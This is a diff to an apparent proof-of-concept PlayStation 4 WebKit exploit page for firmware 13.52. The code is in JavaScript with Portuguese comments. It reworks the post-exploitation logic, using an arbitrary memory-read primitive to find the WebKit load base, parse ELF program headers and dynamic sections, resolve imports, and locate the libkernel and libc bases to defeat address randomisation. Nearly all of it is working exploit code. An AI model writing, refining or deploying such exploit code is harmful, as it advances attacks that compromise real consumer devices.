@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — Notification PoC 2)</title>
+<title>PS4 WebKit Exploit (13.52 — Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -206,76 +206,80 @@ function findElfBase(p, startPtr, maxBack) {
 // ═════════════════════════════════════════════════════════════════════════════
 // RESOLUÇÃO DINÂMICA DE BASES (corrigida)
 // ═════════════════════════════════════════════════════════════════════════════
-async function resolveAllBases(p, webkitBase) {
+async function resolveAllBases(p, parseBase, loadBase) {
+  // parseBase = onde está o header ELF (ou loadBase se não houver)
+  // loadBase  = VA 0 do 1º LOAD (base real do módulo para offsets)
+  if (!loadBase) loadBase = parseBase;
   logH('PARSING ELF DO WEBKIT');
   const imports = {};
   let libkernelBase = null;
   let libcBase = null;
 
   try {
-    // ─── Passo 1: magic ───
-    log('[*] Lendo magic em 0x' + webkitBase.toString(16) + '...');
-    let magic;
+    // ─── Passo 1: magic (opcional no PS4) ───
+    log('[*] Lendo magic em parseBase 0x' + parseBase.toString(16) + '...');
+    let magic = 0;
+    let hasElf = false;
     try {
-      magic = p.read4(webkitBase);
+      magic = p.read4(parseBase) >>> 0;
     } catch (e) {
       log('[-] Falha ao ler magic: ' + e.message, 'e');
-      return { imports, libkernelBase, libcBase };
     }
-    if (magic !== 0x464C457F) {
-      log('[-] WebKit base não aponta para ELF válido! magic=0x' + (magic >>> 0).toString(16), 'e');
-      return { imports, libkernelBase, libcBase };
-    }
-    log('[+] ELF magic válido (\\x7fELF)');
-
-    // ─── Passo 2: program headers ───
-    // e_phoff @ +0x20 (8 bytes), e_phentsize @ +0x36, e_phnum @ +0x38
-    let phoffVal = 0, phnum = 0, phentsize = 0x38;
-    try {
-      const phoffObj = p.read8(webkitBase.add32(0x20));
-      phoffVal = (typeof phoffObj === 'object' && phoffObj.low !== undefined)
-        ? (phoffObj.low >>> 0)
-        : (Number(phoffObj) >>> 0);
-      phnum = p.read2(webkitBase.add32(0x38)) & 0xffff;
-      phentsize = p.read2(webkitBase.add32(0x36)) & 0xffff || 0x38;
-      log('[+] phoff=0x' + phoffVal.toString(16) + ' phnum=' + phnum + ' phentsize=' + phentsize);
-    } catch (e) {
-      log('[-] Falha ao ler program headers: ' + e.message, 'e');
-      return { imports, libkernelBase, libcBase };
+    if (magic === 0x464C457F) {
+      hasElf = true;
+      log('[+] ELF magic válido (\\x7fELF)');
+    } else {
+      log('[!] Sem ELF magic (0x' + magic.toString(16) + ') — parsing limitado', 'w');
     }
 
-    if (phnum > 64) {
-      log('[!] phnum suspeito (' + phnum + '), limitando a 32', 'w');
-      phnum = 32;
-    }
-
-    // ─── Passo 3: achar PT_DYNAMIC ───
+    // ─── Passo 2/3: program headers + PT_DYNAMIC (só se tiver ELF) ───
     let dynamicVaddr = null;
     let dynamicSize = 0;
-    for (let i = 0; i < phnum; i++) {
+
+    if (hasElf) {
+      let phoffVal = 0, phnum = 0, phentsize = 0x38;
       try {
-        const phAddr = webkitBase.add32(phoffVal + i * phentsize);
-        const p_type = p.read4(phAddr) >>> 0;
-        // p_vaddr @ +0x10, p_filesz @ +0x20, p_memsz @ +0x28
-        if (p_type === 2 /* PT_DYNAMIC */) {
-          dynamicVaddr = p.read8(phAddr.add32(0x10));
-          const memsz = p.read8(phAddr.add32(0x28));
-          dynamicSize = (typeof memsz === 'object' && memsz.low !== undefined) ? (memsz.low >>> 0) : (Number(memsz) >>> 0);
-          if (!dynamicSize) {
-            const filesz = p.read8(phAddr.add32(0x20));
-            dynamicSize = (typeof filesz === 'object' && filesz.low !== undefined) ? (filesz.low >>> 0) : (Number(filesz) >>> 0);
-          }
-          log('[+] PT_DYNAMIC vaddr=0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
-          break;
-        }
+        const phoffObj = p.read8(parseBase.add32(0x20));
+        phoffVal = (typeof phoffObj === 'object' && phoffObj.low !== undefined)
+          ? (phoffObj.low >>> 0) : (Number(phoffObj) >>> 0);
+        phnum = p.read2(parseBase.add32(0x38)) & 0xffff;
+        phentsize = p.read2(parseBase.add32(0x36)) & 0xffff || 0x38;
+        log('[+] phoff=0x' + phoffVal.toString(16) + ' phnum=' + phnum + ' phentsize=' + phentsize);
       } catch (e) {
-        log('[!] Erro no PHDR[' + i + ']: ' + e.message, 'w');
+        log('[-] Falha ao ler program headers: ' + e.message, 'e');
+      }
+
+      if (phnum > 64) {
+        log('[!] phnum suspeito (' + phnum + '), limitando a 32', 'w');
+        phnum = 32;
+      }
+
+      for (let i = 0; i < phnum; i++) {
+        try {
+          const phAddr = parseBase.add32(phoffVal + i * phentsize);
+          const p_type = p.read4(phAddr) >>> 0;
+          if (p_type === 2 /* PT_DYNAMIC */) {
+            // p_vaddr é relativo ao load base (VA 0)
+            const dynOff = p.read8(phAddr.add32(0x10));
+            const memsz = p.read8(phAddr.add32(0x28));
+            dynamicSize = (typeof memsz === 'object' && memsz.low !== undefined)
+              ? (memsz.low >>> 0) : (Number(memsz) >>> 0);
+            // Endereço real = loadBase + p_vaddr
+            const offLow = (typeof dynOff === 'object' && dynOff.low !== undefined)
+              ? (dynOff.low >>> 0) : (Number(dynOff) >>> 0);
+            dynamicVaddr = loadBase.add32(offLow);
+            log('[+] PT_DYNAMIC load+0x' + offLow.toString(16) +
+                ' → 0x' + dynamicVaddr.toString(16) + ' size=0x' + dynamicSize.toString(16));
+            break;
+          }
+        } catch (e) {
+          log('[!] Erro no PHDR[' + i + ']: ' + e.message, 'w');
+        }
       }
     }
 
     if (!dynamicVaddr) {
-      log('[-] PT_DYNAMIC não encontrado', 'e');
-      log('[*] Dica: no PS4 o DYNAMIC às vezes usa tipo SCE. Continuando sem imports...', 'w');
+      log('[-] PT_DYNAMIC não encontrado — sem imports via ELF', 'w');
       return { imports, libkernelBase, libcBase };
     }
 
@@ -317,7 +321,7 @@ async function resolveAllBases(p, webkitBase) {
         const importPtr = p.read8(r_offset);
         const realPtr = get_jmptgt(p, importPtr);
         const name = resolveName(rawName);
-        const wkOffset = r_offset.sub(webkitBase);
+        const wkOffset = r_offset.sub(loadBase);
         imports[name] = { rawName, wkOffset, importPtr, realPtr };
       } catch (e) {}
     }
@@ -408,7 +412,7 @@ async function resolveAllBases(p, webkitBase) {
     for (const ref of lcCandidates) {
       log('[*] findElfBase a partir de 0x' + ref.realPtr.toString(16) + ' ...');
       const base = findElfBase(p, ref.realPtr, 0x300000);
-      if (base && base.toString(16) !== webkitBase.toString(16)) {
+      if (base && base.toString(16) !== loadBase.toString(16)) {
         libcBase = base;
         log('[+] libc base: 0x' + libcBase.toString(16), 'ok');
         setCard('c-lc', '0x' + libcBase.toString(16));
@@ -612,52 +616,47 @@ async function main() {
     setCard('c-wk', '0x' + webkitBase.toString(16) + '?');
 
     setTimeout(async () => {
-      // Valida / corrige a base procurando ELF magic
+      // PS4 SPRX: 1º LOAD em file+0x4000 mapeia para VA 0.
+      // loadBase (do ctor) = VA 0 do código — NÃO tem ELF magic.
+      // Header ELF, se mapeado, fica em loadBase - 0x4000.
+      let elfHeaderBase = null;
       try {
-        const candMagic = p.read4(webkitBase) >>> 0;
-        log('[*] Magic no candidato: 0x' + candMagic.toString(16));
+        const atLoad = p.read4(webkitBase) >>> 0;
+        log('[*] Dword em loadBase: 0x' + atLoad.toString(16));
 
-        if (candMagic !== 0x464C457F) {
-          log('[!] Candidato sem ELF magic — varrendo ±8MB...', 'w');
-          let found = null;
-          for (let step = 0; step <= 0x800000 && !found; step += 0x1000) {
-            for (const sign of (step === 0 ? [1] : [1, -1])) {
-              try {
-                const test = sign > 0 ? webkitBase.add32(step) : webkitBase.sub32(step);
-                if ((p.read4(test) >>> 0) === 0x464C457F) {
-                  found = test;
-                  log('[+] ELF magic em 0x' + found.toString(16) +
-                      ' (delta=' + (sign > 0 ? '+' : '-') + '0x' + step.toString(16) + ')', 'ok');
-                  break;
-                }
-              } catch (e) {}
-            }
-            if ((step & 0x1FFFF) === 0 && step) await new Promise(r => setTimeout(r, 0));
+        try {
+          const maybe = webkitBase.sub32(0x4000);
+          const m = p.read4(maybe) >>> 0;
+          log('[*] Dword em loadBase-0x4000: 0x' + m.toString(16));
+          if (m === 0x464C457F) {
+            elfHeaderBase = maybe;
+            log('[+] ELF header encontrado em loadBase-0x4000', 'ok');
           }
-          if (found) {
-            webkitBase = found;
-          } else {
-            log('[-] ELF magic não encontrado perto do candidato.', 'e');
-            log('[*] Possível causa: OFFSET 0x' + hc.toString(16) + ' errado para este build', 'w');
-            setStatus('WebKit base inválida', 'e');
-            setCard('c-wk', 'inválida');
-            return;
-          }
-        } else {
-          log('[+] ELF magic OK no candidato', 'ok');
+        } catch (e) {
+          log('[!] Não leu loadBase-0x4000: ' + (e && e.message ? e.message : e), 'w');
+        }
+
+        if (!elfHeaderBase && atLoad === 0x464C457F) {
+          elfHeaderBase = webkitBase;
+          log('[+] ELF header no próprio loadBase', 'ok');
+        }
+
+        if (!elfHeaderBase) {
+          log('[!] Sem header ELF mapeado — usando só loadBase', 'w');
         }
       } catch (e) {
-        log('[-] Erro ao validar WebKit base: ' + (e && e.message ? e.message : e), 'e');
-        setStatus('Erro na base WebKit', 'e');
-        return;
+        log('[-] Erro ao inspecionar loadBase: ' + (e && e.message ? e.message : e), 'e');
       }
 
-      log('[+] WebKit Base final: 0x' + webkitBase.toString(16), 'ok');
+      log('[+] WebKit loadBase: 0x' + webkitBase.toString(16), 'ok');
       setCard('c-wk', '0x' + webkitBase.toString(16));
 
+      // resolveAllBases: se tivermos ELF header, parseia a partir dele;
+      // senão tenta a partir do loadBase (pode falhar no magic e seguir fallback).
+      const parseBase = elfHeaderBase || webkitBase;
       let result;
       try {
-        result = await resolveAllBases(p, webkitBase);
+        result = await resolveAllBases(p, parseBase, webkitBase);
       } catch (e) {
         log('[-] resolveAllBases throw: ' + (e && e.message ? e.message : e), 'e');
         setStatus('Erro no parsing ELF', 'e');
